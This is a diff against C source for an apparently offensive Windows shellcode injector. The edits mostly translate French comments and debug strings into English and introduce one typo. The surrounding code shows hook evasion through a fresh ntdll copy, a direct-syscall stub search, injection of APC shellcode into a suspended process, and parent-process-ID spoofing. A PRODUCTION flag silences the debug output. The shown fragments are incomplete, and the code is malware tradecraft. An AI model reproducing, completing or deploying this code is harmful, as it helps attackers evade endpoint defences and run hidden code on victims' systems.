@@ -120,7 +120,7 @@ static NTSTATUS SysCloseHandle(HANDLE Handle)
 
 // Utility functions for syscall initialization
 
-// Loads fresh ntdll.dll from disk (clean copy without hooks)
+// Loads fresh ntdll.dll (clean copy without hooks)
 static BOOL LoadFreshNtdllForInjection(void)
 {
     CHAR ntdllPath[MAX_PATH];
@@ -171,7 +171,7 @@ static PVOID FindSyscallAddressInNtdll(PVOID moduleBase)
 
     if (!textBase) return NULL;
 
-    // Chercher 0F 05 C3
+    // Searcu 0F 05 C3
     BYTE *current = (BYTE *)textBase;
     BYTE *end = current + textSize - 2;
 
@@ -320,10 +320,10 @@ BOOL InjectShellcodeAPC(
     lstrcpynA(result->targetProcess, targetProcess, MAX_PATH);
 
     #ifndef PRODUCTION
-    printf("[*] Création du processus en mode suspendu...\n");
+    printf("[*] Creating process in suspended state...\n");
     #endif
     #ifndef PRODUCTION
-    printf("    Cible: %s\n", targetProcess);
+    printf("    Target: %s\n", targetProcess);
     #endif
 
     // STEP 1: Create suspended process
@@ -335,7 +335,7 @@ BOOL InjectShellcodeAPC(
             NULL, NULL, &si, &pi))
     {
         #ifndef PRODUCTION
-        printf("[-] Échec de CreateProcessA: %lu\n", GetLastError());
+        printf("[-] CreateProcessA failed: %lu\n", GetLastError());
         #endif
         return FALSE;
     }
@@ -410,7 +410,7 @@ BOOL InjectShellcodeAPC(
 
     status = SysQueueTask(
         pi.hThread,
-        baseAddress,  // APC routine = notre shellcode
+        baseAddress,  // APC routine = our shellcode
         NULL,         // ApcArgument1
         NULL,         // ApcArgument2
         NULL);        // ApcArgument3
@@ -468,7 +468,6 @@ BOOL InjectShellcodeAPC(
 }
 
 // Cleans up allocated resources for injection syscalls
-
 VOID CleanupInjectionSyscalls(void)
 {
     if (g_FreshNtdll) {
@@ -478,7 +477,6 @@ VOID CleanupInjectionSyscalls(void)
 }
 
 // Prints injection result in a formatted manner
-
 VOID PrintInjectionResult(PINJECTION_RESULT result)
 {
     printf("=== Injection Result ===\n");
@@ -514,7 +512,6 @@ VOID PrintInjectionResult(PINJECTION_RESULT result)
 }
 
 // APC INJECTION WITH PPID SPOOFING
-
 BOOL InjectShellcodeAPCWithPPIDSpoof(
     const char* targetProcess,
     const char* parentProcess,
@@ -655,8 +652,7 @@ BOOL InjectShellcodeAPCWithPPIDSpoof(
     printf("[+] Thread resumed\n");
     #endif
 
-    // CRITICAL: Wait for APC to execute before closing handles
-    // If we close immediately, the process dies before shellcode runs
+    // Wait for APC to execute before closing handles
     #ifndef PRODUCTION
     printf("[*] Waiting for APC execution (2s)...\n");
     #endif
